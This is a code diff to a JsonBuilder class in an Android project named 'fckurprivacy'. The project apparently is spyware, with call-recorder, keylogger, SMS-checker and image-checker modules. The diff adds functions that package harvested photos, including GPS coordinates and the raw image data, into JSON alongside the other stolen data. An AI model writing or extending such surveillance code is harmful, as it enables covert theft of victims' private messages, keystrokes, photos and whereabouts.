@@ -2,6 +2,7 @@ package com.vergermiya.harevost.fckurprivacy.Util;
 
 import com.vergermiya.harevost.fckurprivacy.CallRecorder.CallRecord;
 import com.vergermiya.harevost.fckurprivacy.CallRecorder.CallRecordJSon;
+import com.vergermiya.harevost.fckurprivacy.ImageChecker.ImageJson;
 import com.vergermiya.harevost.fckurprivacy.InfoChecker.InfoJson;
 import com.vergermiya.harevost.fckurprivacy.KeyLogger.KeyLogJson;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsJson;
@@ -132,6 +133,37 @@ public class JsonBuilder {
             e.printStackTrace();
         }
         return jsonText;
+    }
+
+    public static JSONStringer buildImageJson(ImageJson imageJson) {
+        JSONStringer jsonText = new JSONStringer();
+        try {
+            jsonText.object();
+
+            jsonText.key("Path").value(imageJson.getPath());
+            jsonText.key("Name").value(imageJson.getName());
+            jsonText.key("AddDate").value(imageJson.getAddDate());
+            jsonText.key("Title").value(imageJson.getTitle());
+            jsonText.key("ModifyDate").value(imageJson.getModifyDate());
+            jsonText.key("Latitude").value(imageJson.getLatitude());
+            jsonText.key("Longitude").value(imageJson.getLongitude());
+            jsonText.key("Size").value(imageJson.getSize());
+            jsonText.key("Image").value(imageJson.getImage());
+
+            jsonText.endObject();
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+        return jsonText;
+    }
+
+    public static JSONArray buildImageJsons(ArrayList<ImageJson> imageJsons) {
+        JSONArray jsonArray = new JSONArray();
+        for (ImageJson imageJson : imageJsons) {
+            JSONStringer jsonStringer = JsonBuilder.buildImageJson(imageJson);
+            jsonArray.put(jsonStringer);
+        }
+        return jsonArray;
     }
 }
 
